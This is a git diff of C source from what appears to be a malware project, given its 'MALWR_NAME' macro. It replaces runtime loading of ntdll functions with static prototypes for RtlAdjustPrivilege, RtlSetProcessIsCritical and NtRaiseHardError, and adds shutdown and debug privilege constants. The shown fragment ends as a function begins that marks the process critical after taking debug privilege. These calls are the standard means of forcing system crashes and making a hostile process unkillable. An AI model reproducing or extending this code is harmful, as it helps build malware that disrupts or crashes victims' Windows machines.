@@ -1,58 +1,40 @@
 #include "../../HeaderFiles/N0TiLLerka.h"
-#ifndef DISABLE_NT_FUNCTIONS
 
+#ifndef DISABLE_NT_FUNCTIONS
 // NT Macros
 #define OPTION_SHUTDOWN_SYSTEM 6
 #define SE_SHUTDOWN_PRIVILEGE 19
 #define SE_DEBUG_PRIVILEGE 20
 
+// Typedefinitions
+typedef struct {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
 // NT/RTL Function Prototypes
-typedef NTSTATUS(NTAPI* pRTLADJUSTPRIVILEGE)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
-pRTLADJUSTPRIVILEGE RtlAdjustPrivilege;
-typedef NTSTATUS(STDAPIVCALLTYPE* pRTLSETPROCESSISCRITICAL)(BOOLEAN, PBOOLEAN, BOOLEAN);
-pRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;
-typedef NTSTATUS(NTAPI* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
-pNTRAISEHARDERROR NtRaiseHardError;
+NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(
+	_In_ ULONG,
+	_In_ BOOLEAN,
+	_In_ BOOLEAN,
+	_Out_ PBOOLEAN
+);
+NTSYSAPI NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
+	_In_ BOOLEAN,
+	_Out_opt_ PBOOLEAN,
+	_In_ BOOLEAN
+);
+NTSYSAPI NTSTATUS WINAPI NtRaiseHardError(
+	_In_ NTSTATUS,
+	_In_ ULONG,
+	_In_opt_ PUNICODE_STRING,
+	_In_ PVOID*,
+	_In_ UINT,
+	_Out_ PUINT
+);
 
-BOOL fnImportNTDLLFunctions(VOID) {
-	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
-	if (hNtdll) {
-		RtlAdjustPrivilege = (pRTLADJUSTPRIVILEGE)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
-		if (!RtlAdjustPrivilege) {
-#ifdef DEBUG_MSG
-			MessageBox(NULL, L"\"RtlAdjustPrivilege\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-			FreeLibrary(hNtdll);
-			return FALSE;
-		}
-
-		RtlSetProcessIsCritical = (pRTLSETPROCESSISCRITICAL)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
-		if (!RtlSetProcessIsCritical) {
-#ifdef DEBUG_MSG
-			MessageBox(NULL, L"\"RtlSetProcessIsCritical\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-			FreeLibrary(hNtdll);
-			return FALSE;
-		}
-
-		NtRaiseHardError = (pNTRAISEHARDERROR)GetProcAddress(hNtdll, "NtRaiseHardError");
-		if (!RtlAdjustPrivilege) {
-#ifdef DEBUG_MSG
-			MessageBox(NULL, L"\"NtRaiseHardError\" is invalid", L"GetProcAddress", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-			FreeLibrary(hNtdll);
-			return FALSE;
-		}
-	} else {
-#ifdef DEBUG_MSG
-		MessageBox(NULL, L"Couldn't load \"ntdll.dll\"", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif // DEBUG_MSG
-		return FALSE;
-	}
-
-	return TRUE;
-}
-
+// NT Utilitie Functions
 BOOL fnNTSetProcessIsCritical(BOOLEAN blIsCritical) {
 	BOOLEAN bl;
 	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
